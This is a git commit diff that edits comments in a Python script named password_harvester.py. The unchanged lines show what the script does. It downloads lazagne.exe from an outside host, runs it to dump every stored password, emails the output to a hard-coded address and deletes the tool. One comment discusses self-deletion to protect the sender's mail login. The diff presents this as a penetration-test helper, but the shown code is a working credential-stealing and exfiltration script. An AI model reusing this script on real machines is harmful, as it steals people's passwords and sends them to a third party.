fe050a78f02fc520c2547500011b10454112dfd9
Maffey <matiusz98@gmail.com>
2020-08-15 14:30:00 -0400

    improved documentation

--- scripts/escalation/password_harvester.py
+++ scripts/escalation/password_harvester.py
@@ -7,9 +7,6 @@ import os
 import tempfile
 
 
-# todo: package all contents of var/www/html/downloads folder into some zip?
-
-
 def download(url):
     get_response = requests.get(url)
     file_name = url.split("/")[-1]
@@ -26,10 +23,11 @@ def send_mail(email, password, message):
 
 
 os.chdir(tempfile.gettempdir())
-# TODO: get newer windows. 7 sucks. it can't even handle this lol.
+# The code below requires the obligatory download of Lazagne before executing a penetration test.
 download("http://10.0.2.15/downloads/lazagne.exe")
 result = subprocess.check_output("lazagne.exe all", shell=True)
-# todo: if we want to keep our login data to email intact, force self-removal after running the script.
+# TODO: if we want to keep our login data to email intact, force self-removal after running the script.
 # Further read: https://stackoverflow.com/questions/10112601/how-to-make-scripts-auto-delete-at-the-end-of-execution
+# Note: The problem mentioned above is partially solved by packaging the script into an executable.
 send_mail("example@gmail.com", "password", result)  # fill with necessary data for it to work
 os.remove("lazagne.exe")
